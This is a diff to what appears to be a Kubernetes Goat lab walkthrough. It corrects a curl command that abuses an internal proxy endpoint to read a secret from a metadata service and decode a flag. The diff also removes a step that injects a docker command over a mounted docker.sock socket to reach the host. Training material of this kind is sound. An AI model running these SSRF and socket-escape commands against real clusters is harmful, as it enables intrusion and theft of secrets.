@@ -14,10 +14,5 @@ curl -H 'content-type: application/json' localhost:1234 --data-raw '{"endpoint":
 * We can decode the secret flag.
 
 ```bash
-curl -H 'content-type: application/json' localhost:1234 --data-rawsecrets/kubernetes-goat","method":"GET","headers":""}'  | jq .data |tr -d '"'| base64 -d &&echo 
-```
-* Now we can access the host system by running the following docker commands with passing `docker.sock` UNIX socket
-
-```bash
-;/tmp/docker/docker -H unix:///custom/docker/docker.sock images
+curl -H 'content-type: application/json' localhost:1234 --data-raw '{"endpoint":"http://metadata-db/latest/secrets/kubernetes-goat","method":"GET","headers":""}'  | jq .data |tr -d '"'| base64 -d &&echo 
 ```
